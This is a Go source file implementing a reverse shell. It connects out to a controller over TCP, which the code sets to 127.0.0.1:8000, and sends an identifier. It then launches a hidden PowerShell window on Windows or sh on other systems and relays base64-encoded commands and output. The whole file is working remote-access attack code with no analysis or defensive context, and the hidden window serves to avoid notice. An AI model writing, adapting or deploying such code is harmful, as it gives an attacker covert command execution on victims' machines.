package main

import (
	"bufio"
	"encoding/base64"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

func handleErr(err error) {
	if err != nil {
		os.Exit(1)
	}
}

func cleanString(s string) string {
	return strings.Split(strings.TrimSpace(s), "\n")[0]
}

func getData(conn net.Conn) string {
	d, err := bufio.NewReader(conn).ReadBytes('\n')
	handleErr(err)
	decodedData, _ := base64.StdEncoding.DecodeString(strings.Split(strings.TrimSpace(string(d)), "\n")[0])
	return string(decodedData)
}

func sendData(conn net.Conn, data string) {
	encodedData := base64.StdEncoding.EncodeToString([]byte(data)) + "\n"
	_, err := conn.Write([]byte(encodedData))
	handleErr(err)
}

func readPipe(pipe io.ReadCloser, conn net.Conn) {
	reader := bufio.NewReader(pipe)
	for {
		buff, err := reader.ReadBytes('\n')
		handleErr(err)
		sendData(conn, string(buff))
	}
}

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:8000")
	handleErr(err)
	defer conn.Close()
	sendData(conn, "goRS-ID")

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("sh")
	}

	stdout, err := cmd.StdoutPipe()
	handleErr(err)
	stdin, err := cmd.StdinPipe()
	handleErr(err)
	stderr, err := cmd.StderrPipe()
	handleErr(err)
	_, err = io.WriteString(stdin, "\n")
	handleErr(err)

	go readPipe(stdout, conn)
	go readPipe(stderr, conn)

	cmd.Start()
	for {
		cmdToExecute := getData(conn)
		if cleanString(cmdToExecute) == "!q" {
			break
		}
		_, err = io.WriteString(stdin, cmdToExecute)
		handleErr(err)
		_, err = io.WriteString(stdin, "\n")
		handleErr(err)
	}
	stdin.Close()
	cmd.Wait()
}
